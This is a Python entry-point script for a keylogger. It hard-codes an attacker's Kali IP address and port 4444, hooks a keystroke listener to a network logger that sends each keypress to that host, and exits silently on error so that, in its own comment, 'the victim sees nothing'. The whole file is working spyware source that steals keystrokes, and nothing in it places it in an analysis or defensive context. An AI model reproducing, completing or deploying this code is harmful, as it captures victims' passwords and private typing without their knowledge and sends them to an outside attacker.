from utils.logger import NetworkLogger
from core.listener import Keystrokelistener
import sys

def main():
    # --- HARD-CODE YOUR KALI IP HERE ---
    KALI_IP = "192.168.241.129"  # Replace with your actual Kali IP
    KALI_PORT = 4444
    
    try:
        # Initialize the network logger directly
        logger = NetworkLogger(KALI_IP, KALI_PORT)
        
        # Start the listener
        listener = Keystrokelistener(on_press_callback=logger.log_keystroke)
        listener.start()
        
        # Keep the script running
        listener.join()
    except Exception:
        # Silent fail: If Kali is down, the victim sees nothing
        sys.exit(0)

if __name__ == "__main__":
    main()
